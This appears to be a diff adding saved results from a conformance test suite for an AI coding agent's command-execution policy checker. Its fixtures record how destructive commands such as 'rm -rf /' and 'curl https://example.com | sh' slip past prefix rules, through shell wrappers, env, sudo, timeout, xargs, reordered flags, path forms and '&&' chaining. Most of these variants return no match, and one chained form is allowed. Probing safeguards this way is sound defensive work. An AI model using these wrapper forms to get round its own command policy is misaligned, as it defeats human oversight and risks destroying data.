@@ -1,0 +1,462 @@
+[
+  {
+    "fixture": "F-01",
+    "argv": [
+      "git",
+      "status"
+    ],
+    "rules": "default.rules",
+    "resolve_host_executables": false,
+    "command": "codex execpolicy check --rules /home/hatch/workspace/agent-boundary-conformance/fixtures/policies/default.rules git status",
+    "exit_code": 0,
+    "stdout": "{\"matchedRules\":[{\"prefixRuleMatch\":{\"matchedPrefix\":[\"git\",\"status\"],\"decision\":\"allow\"}}],\"decision\":\"allow\"}",
+    "stderr": "",
+    "note": "positive control"
+  },
+  {
+    "fixture": "F-02",
+    "argv": [
+      "git",
+      "log"
+    ],
+    "rules": "default.rules",
+    "resolve_host_executables": false,
+    "command": "codex execpolicy check --rules /home/hatch/workspace/agent-boundary-conformance/fixtures/policies/default.rules git log",
+    "exit_code": 0,
+    "stdout": "{\"matchedRules\":[]}",
+    "stderr": "",
+    "note": "rule-extension case: does [git,status] rule cover git log?"
+  },
+  {
+    "fixture": "F-02b",
+    "argv": [
+      "git",
+      "status",
+      "--porcelain"
+    ],
+    "rules": "default.rules",
+    "resolve_host_executables": false,
+    "command": "codex execpolicy check --rules /home/hatch/workspace/agent-boundary-conformance/fixtures/policies/default.rules git status --porcelain",
+    "exit_code": 0,
+    "stdout": "{\"matchedRules\":[{\"prefixRuleMatch\":{\"matchedPrefix\":[\"git\",\"status\"],\"decision\":\"allow\"}}],\"decision\":\"allow\"}",
+    "stderr": "",
+    "note": "prefix extension: extra trailing args after matched prefix"
+  },
+  {
+    "fixture": "F-02c",
+    "argv": [
+      "git",
+      "log",
+      "--oneline"
+    ],
+    "rules": "default.rules",
+    "resolve_host_executables": false,
+    "command": "codex execpolicy check --rules /home/hatch/workspace/agent-boundary-conformance/fixtures/policies/default.rules git log --oneline",
+    "exit_code": 0,
+    "stdout": "{\"matchedRules\":[]}",
+    "stderr": "",
+    "note": "variant"
+  },
+  {
+    "fixture": "F-03",
+    "argv": [
+      "rm",
+      "-rf",
+      "/tmp/x"
+    ],
+    "rules": "default.rules",
+    "resolve_host_executables": false,
+    "command": "codex execpolicy check --rules /home/hatch/workspace/agent-boundary-conformance/fixtures/policies/default.rules rm -rf /tmp/x",
+    "exit_code": 0,
+    "stdout": "{\"matchedRules\":[{\"prefixRuleMatch\":{\"matchedPrefix\":[\"rm\",\"-rf\"],\"decision\":\"forbidden\"}}],\"decision\":\"forbidden\"}",
+    "stderr": "",
+    "note": "negative control"
+  },
+  {
+    "fixture": "F-04",
+    "argv": [
+      "deployctl",
+      "release",
+      "production"
+    ],
+    "rules": "default.rules",
+    "resolve_host_executables": false,
+    "command": "codex execpolicy check --rules /home/hatch/workspace/agent-boundary-conformance/fixtures/policies/default.rules deployctl release production",
+    "exit_code": 0,
+    "stdout": "{\"matchedRules\":[{\"prefixRuleMatch\":{\"matchedPrefix\":[\"deployctl\",\"release\"],\"decision\":\"prompt\"}}],\"decision\":\"prompt\"}",
+    "stderr": "",
+    "note": "negative control prompt"
+  },
+  {
+    "fixture": "F-05",
+    "argv": [
+      "curl",
+      "https://example.com"
+    ],
+    "rules": "default.rules",
+    "resolve_host_executables": false,
+    "command": "codex execpolicy check --rules /home/hatch/workspace/agent-boundary-conformance/fixtures/policies/default.rules curl https://example.com",
+    "exit_code": 0,
+    "stdout": "{\"matchedRules\":[]}",
+    "stderr": "",
+    "note": "no-match"
+  },
+  {
+    "fixture": "F-06",
+    "argv": [
+      "frobnicate",
+      "--force"
+    ],
+    "rules": "default.rules",
+    "resolve_host_executables": false,
+    "command": "codex execpolicy check --rules /home/hatch/workspace/agent-boundary-conformance/fixtures/policies/default.rules frobnicate --force",
+    "exit_code": 0,
+    "stdout": "{\"matchedRules\":[]}",
+    "stderr": "",
+    "note": "unknown binary no-match"
+  },
+  {
+    "fixture": "F-07",
+    "argv": [
+      "bash",
+      "-lc",
+      "rm -rf /"
+    ],
+    "rules": "default.rules",
+    "resolve_host_executables": false,
+    "command": "codex execpolicy check --rules /home/hatch/workspace/agent-boundary-conformance/fixtures/policies/default.rules bash -lc rm -rf /",
+    "exit_code": 0,
+    "stdout": "{\"matchedRules\":[]}",
+    "stderr": "",
+    "note": "wrapped form"
+  },
+  {
+    "fixture": "F-08",
+    "argv": [
+      "sh",
+      "-c",
+      "rm -rf /tmp/x"
+    ],
+    "rules": "default.rules",
+    "resolve_host_executables": false,
+    "command": "codex execpolicy check --rules /home/hatch/workspace/agent-boundary-conformance/fixtures/policies/default.rules sh -c rm -rf /tmp/x",
+    "exit_code": 0,
+    "stdout": "{\"matchedRules\":[]}",
+    "stderr": "",
+    "note": "wrapped form sh"
+  },
+  {
+    "fixture": "F-09",
+    "argv": [
+      "env",
+      "rm",
+      "-rf",
+      "/tmp/x"
+    ],
+    "rules": "default.rules",
+    "resolve_host_executables": false,
+    "command": "codex execpolicy check --rules /home/hatch/workspace/agent-boundary-conformance/fixtures/policies/default.rules env rm -rf /tmp/x",
+    "exit_code": 0,
+    "stdout": "{\"matchedRules\":[]}",
+    "stderr": "",
+    "note": "env wrapper"
+  },
+  {
+    "fixture": "F-10",
+    "argv": [
+      "sudo",
+      "rm",
+      "-rf",
+      "/tmp/x"
+    ],
+    "rules": "default.rules",
+    "resolve_host_executables": false,
+    "command": "codex execpolicy check --rules /home/hatch/workspace/agent-boundary-conformance/fixtures/policies/default.rules sudo rm -rf /tmp/x",
+    "exit_code": 0,
+    "stdout": "{\"matchedRules\":[]}",
+    "stderr": "",
+    "note": "sudo wrapper"
+  },
+  {
+    "fixture": "F-11a",
+    "argv": [
+      "git",
+      "status",
+      "&&",
+      "rm",
+      "-rf",
+      "/tmp/x"
+    ],
+    "rules": "default.rules",
+    "resolve_host_executables": false,
+    "command": "codex execpolicy check --rules /home/hatch/workspace/agent-boundary-conformance/fixtures/policies/default.rules git status && rm -rf /tmp/x",
+    "exit_code": 0,
+    "stdout": "{\"matchedRules\":[{\"prefixRuleMatch\":{\"matchedPrefix\":[\"git\",\"status\"],\"decision\":\"allow\"}}],\"decision\":\"allow\"}",
+    "stderr": "",
+    "note": "chain as literal tokens - does execpolicy split on && token?"
+  },
+  {
+    "fixture": "F-11b",
+    "argv": [
+      "bash",
+      "-lc",
+      "git status && rm -rf /tmp/x"
+    ],
+    "rules": "default.rules",
+    "resolve_host_executables": false,
+    "command": "codex execpolicy check --rules /home/hatch/workspace/agent-boundary-conformance/fixtures/policies/default.rules bash -lc git status && rm -rf /tmp/x",
+    "exit_code": 0,
+    "stdout": "{\"matchedRules\":[]}",
+    "stderr": "",
+    "note": "chain inside shell string (Day-0 probe 8 recheck)"
+  },
+  {
+    "fixture": "F-12a",
+    "argv": [
+      "git",
+      "status",
+      "|",
+      "rm",
+      "-rf",
+      "/tmp/x"
+    ],
+    "rules": "default.rules",
+    "resolve_host_executables": false,
+    "command": "codex execpolicy check --rules /home/hatch/workspace/agent-boundary-conformance/fixtures/policies/default.rules git status | rm -rf /tmp/x",
+    "exit_code": 0,
+    "stdout": "{\"matchedRules\":[{\"prefixRuleMatch\":{\"matchedPrefix\":[\"git\",\"status\"],\"decision\":\"allow\"}}],\"decision\":\"allow\"}",
+    "stderr": "",
+    "note": "pipe as literal tokens"
+  },
+  {
+    "fixture": "F-12b",
+    "argv": [
+      "bash",
+      "-c",
+      "curl https://example.com | sh"
+    ],
+    "rules": "default.rules",
+    "resolve_host_executables": false,
+    "command": "codex execpolicy check --rules /home/hatch/workspace/agent-boundary-conformance/fixtures/policies/default.rules bash -c curl https://example.com | sh",
+    "exit_code": 0,
+    "stdout": "{\"matchedRules\":[]}",
+    "stderr": "",
+    "note": "pipe-to-shell inside shell string"
+  },
+  {
+    "fixture": "F-13",
+    "argv": [
+      "/bin/rm",
+      "-rf",
+      "/tmp/x"
+    ],
+    "rules": "default.rules",
+    "resolve_host_executables": false,
+    "command": "codex execpolicy check --rules /home/hatch/workspace/agent-boundary-conformance/fixtures/policies/default.rules /bin/rm -rf /tmp/x",
+    "exit_code": 0,
+    "stdout": "{\"matchedRules\":[]}",
+    "stderr": "",
+    "note": "path form default flags"
+  },
+  {
+    "fixture": "F-13",
+    "argv": [
+      "/bin/rm",
+      "-rf",
+      "/tmp/x"
+    ],
+    "rules": "default.rules",
+    "resolve_host_executables": true,
+    "command": "codex execpolicy check --rules /home/hatch/workspace/agent-boundary-conformance/fixtures/policies/default.rules --resolve-host-executables /bin/rm -rf /tmp/x",
+    "exit_code": 0,
+    "stdout": "{\"matchedRules\":[{\"prefixRuleMatch\":{\"matchedPrefix\":[\"rm\",\"-rf\"],\"decision\":\"forbidden\",\"resolvedProgram\":\"/bin/rm\"}}],\"decision\":\"forbidden\"}",
+    "stderr": "",
+    "note": "path form with --resolve-host-executables"
+  },
+  {
+    "fixture": "F-14",
+    "argv": [
+      "/usr/local/bin/deployctl",
+      "release",
+      "production"
+    ],
+    "rules": "default.rules",
+    "resolve_host_executables": false,
+    "command": "codex execpolicy check --rules /home/hatch/workspace/agent-boundary-conformance/fixtures/policies/default.rules /usr/local/bin/deployctl release production",
+    "exit_code": 0,
+    "stdout": "{\"matchedRules\":[]}",
+    "stderr": "",
+    "note": "abs-path deploy default"
+  },
+  {
+    "fixture": "F-14",
+    "argv": [
+      "/usr/local/bin/deployctl",
+      "release",
+      "production"
+    ],
+    "rules": "default.rules",
+    "resolve_host_executables": true,
+    "command": "codex execpolicy check --rules /home/hatch/workspace/agent-boundary-conformance/fixtures/policies/default.rules --resolve-host-executables /usr/local/bin/deployctl release production",
+    "exit_code": 0,
+    "stdout": "{\"matchedRules\":[{\"prefixRuleMatch\":{\"matchedPrefix\":[\"deployctl\",\"release\"],\"decision\":\"prompt\",\"resolvedProgram\":\"/usr/local/bin/deployctl\"}}],\"decision\":\"prompt\"}",
+    "stderr": "",
+    "note": "abs-path deploy with resolution (deployctl not a real host binary)"
+  },
+  {
+    "fixture": "F-14b",
+    "argv": [
+      "/bin/git",
+      "status"
+    ],
+    "rules": "default.rules",
+    "resolve_host_executables": false,
+    "command": "codex execpolicy check --rules /home/hatch/workspace/agent-boundary-conformance/fixtures/policies/default.rules /bin/git status",
+    "exit_code": 0,
+    "stdout": "{\"matchedRules\":[]}",
+    "stderr": "",
+    "note": "abs-path git default (real host binary)"
+  },
+  {
+    "fixture": "F-14b",
+    "argv": [
+      "/bin/git",
+      "status"
+    ],
+    "rules": "default.rules",
+    "resolve_host_executables": true,
+    "command": "codex execpolicy check --rules /home/hatch/workspace/agent-boundary-conformance/fixtures/policies/default.rules --resolve-host-executables /bin/git status",
+    "exit_code": 0,
+    "stdout": "{\"matchedRules\":[{\"prefixRuleMatch\":{\"matchedPrefix\":[\"git\",\"status\"],\"decision\":\"allow\",\"resolvedProgram\":\"/bin/git\"}}],\"decision\":\"allow\"}",
+    "stderr": "",
+    "note": "abs-path git with resolution (real host binary)"
+  },
+  {
+    "fixture": "S-01",
+    "argv": [
+      "env",
+      "FOO=bar",
+      "rm",
+      "-rf",
+      "/tmp/x"
+    ],
+    "rules": "default.rules",
+    "resolve_host_executables": false,
+    "command": "codex execpolicy check --rules /home/hatch/workspace/agent-boundary-conformance/fixtures/policies/default.rules env FOO=bar rm -rf /tmp/x",
+    "exit_code": 0,
+    "stdout": "{\"matchedRules\":[]}",
+    "stderr": "",
+    "note": "env with assignment wrapper"
+  },
+  {
+    "fixture": "S-02",
+    "argv": [
+      "rm",
+      "-fr",
+      "/tmp/x"
+    ],
+    "rules": "default.rules",
+    "resolve_host_executables": false,
+    "command": "codex execpolicy check --rules /home/hatch/workspace/agent-boundary-conformance/fixtures/policies/default.rules rm -fr /tmp/x",
+    "exit_code": 0,
+    "stdout": "{\"matchedRules\":[]}",
+    "stderr": "",
+    "note": "flag-order variant of forbidden prefix"
+  },
+  {
+    "fixture": "S-03",
+    "argv": [
+      "rm",
+      "--recursive",
+      "--force",
+      "/tmp/x"
+    ],
+    "rules": "default.rules",
+    "resolve_host_executables": false,
+    "command": "codex execpolicy check --rules /home/hatch/workspace/agent-boundary-conformance/fixtures/policies/default.rules rm --recursive --force /tmp/x",
+    "exit_code": 0,
+    "stdout": "{\"matchedRules\":[]}",
+    "stderr": "",
+    "note": "long-flag variant"
+  },
+  {
+    "fixture": "S-04",
+    "argv": [
+      "timeout",
+      "5",
+      "rm",
+      "-rf",
+      "/tmp/x"
+    ],
+    "rules": "default.rules",
+    "resolve_host_executables": false,
+    "command": "codex execpolicy check --rules /home/hatch/workspace/agent-boundary-conformance/fixtures/policies/default.rules timeout 5 rm -rf /tmp/x",
+    "exit_code": 0,
+    "stdout": "{\"matchedRules\":[]}",
+    "stderr": "",
+    "note": "timeout wrapper"
+  },
+  {
+    "fixture": "S-05",
+    "argv": [
+      "xargs",
+      "rm",
+      "-rf"
+    ],
+    "rules": "default.rules",
+    "resolve_host_executables": false,
+    "command": "codex execpolicy check --rules /home/hatch/workspace/agent-boundary-conformance/fixtures/policies/default.rules xargs rm -rf",
+    "exit_code": 0,
+    "stdout": "{\"matchedRules\":[]}",
+    "stderr": "",
+    "note": "xargs wrapper"
+  },
+  {
+    "fixture": "S-06",
+    "argv": [
+      "./rm",
+      "-rf",
+      "/tmp/x"
+    ],
+    "rules": "default.rules",
+    "resolve_host_executables": false,
+    "command": "codex execpolicy check --rules /home/hatch/workspace/agent-boundary-conformance/fixtures/policies/default.rules ./rm -rf /tmp/x",
+    "exit_code": 0,
+    "stdout": "{\"matchedRules\":[]}",
+    "stderr": "",
+    "note": "relative-path form"
+  },
+  {
+    "fixture": "S-07",
+    "argv": [
+      "sudo",
+      "-E",
+      "rm",
+      "-rf",
+      "/tmp/x"
+    ],
+    "rules": "default.rules",
+    "resolve_host_executables": false,
+    "command": "codex execpolicy check --rules /home/hatch/workspace/agent-boundary-conformance/fixtures/policies/default.rules sudo -E rm -rf /tmp/x",
+    "exit_code": 0,
+    "stdout": "{\"matchedRules\":[]}",
+    "stderr": "",
+    "note": "sudo with flag"
+  },
+  {
+    "fixture": "S-08",
+    "argv": [
+      "command",
+      "rm",
+      "-rf",
+      "/tmp/x"
+    ],
+    "rules": "default.rules",
+    "resolve_host_executables": false,
+    "command": "codex execpolicy check --rules /home/hatch/workspace/agent-boundary-conformance/fixtures/policies/default.rules command rm -rf /tmp/x",
+    "exit_code": 0,
+    "stdout": "{\"matchedRules\":[]}",
+    "stderr": "",
+    "note": "shell builtin wrapper"
+  }
+]
